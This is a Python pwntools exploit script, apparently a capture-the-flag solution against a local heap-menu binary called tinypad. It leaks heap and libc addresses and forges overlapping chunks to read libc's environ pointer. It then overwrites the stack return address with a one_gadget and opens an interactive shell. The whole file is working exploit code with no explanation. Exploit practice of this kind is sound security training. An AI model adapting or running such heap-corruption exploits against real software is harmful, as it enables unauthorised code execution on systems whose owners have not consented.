from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop = True)
ruf  = lambda s    : io.recvuntil(s, drop = False)
addr = lambda s    : u64(io.recvuntil(s, drop = True).ljust(8, b'\x00'))
sh   = lambda      : io.interactive()

def debug():
	gdb.attach(io)
	pause()

MENU = b'(CMD)>>> '
SIZE = b'(SIZE)>>> '
CONTENT = b'(CONTENT)>>> '
INDEX = b'(INDEX)>>> '
IS_OK = b'(Y/n)>>> '
def add(size, content, line = True):
	sla(MENU, b'A')
	sla(SIZE, str(size).encode())
	if line:
		sla(CONTENT, content)
	else:
		sda(CONTENT, content)

def dele(idx):
	sla(MENU, b'D')
	sla(INDEX, str(idx).encode())	

def edit(idx, content, line = True, is_ok = True):
	sla(MENU, b'E')
	sla(INDEX, str(idx).encode())
	if line:
		sla(CONTENT, content)
	else:
		sda(CONTENT, content)
	
	if is_ok:
		sla(IS_OK, b'Y')
	else:
		sla(IS_OK, b'n')

tinypad = 0x602040
chunk_info = tinypad + 0x100
fake_chunk = tinypad + 0x40

add(0x18, b'A')
add(0xF8, b'A')
add(0x18, b'A')
add(0x20, b'A')

dele(3)
dele(1)
dele(2)
dele(4)

rut(b'# CONTENT: ')
heap_base = addr(b'\n') - 0x120
rut(b'# CONTENT: ')
unsorted_bin = addr(b'\n')
libc_base = unsorted_bin - 88 - 0x10 - libc.symbols['__malloc_hook']
print("heap_base: ", hex(heap_base))
print("libc_base: ", hex(libc_base))
print("unsorted_bin: ", hex(unsorted_bin))

offset = heap_base + 0x20 - fake_chunk
payload = b'A'*0x10 + p64(offset)
add(0x18, payload)
add(0xF8, b'A'*0xF0)
add(0x88, b'A'*0x80)
add(0x88, b'A'*0x80)

payload = b'A'*0x40 + p64(0) + p64(0x21) + p64(fake_chunk)*2 + p64(0x20)
edit(3, payload)

dele(2)

payload = b'A'*0x40 + p64(0) + p64(0x101) + p64(unsorted_bin)*2
edit(4, payload)

environ_addr = libc_base + libc.symbols['environ']
payload = b'A'*0xB0 + p64(0x18) + p64(environ_addr) + p64(8) + p64(0x602148)
add(0xF8, payload)

rut(b'# CONTENT: ')
environ = addr(b'\n')
ret_addr = environ - 240
print("environ: ", hex(environ))
print("ret_addr: ", hex(ret_addr))

one_gadget1 = libc_base + 0x45226
one_gadget2 = libc_base + 0x4527a
one_gadget3 = libc_base + 0xf03a4
one_gadget4 = libc_base + 0xf1247

edit(2, p64(ret_addr))
edit(1, p64(one_gadget4))
#debug()
sla(MENU, b'Q')
#debug()

sh()
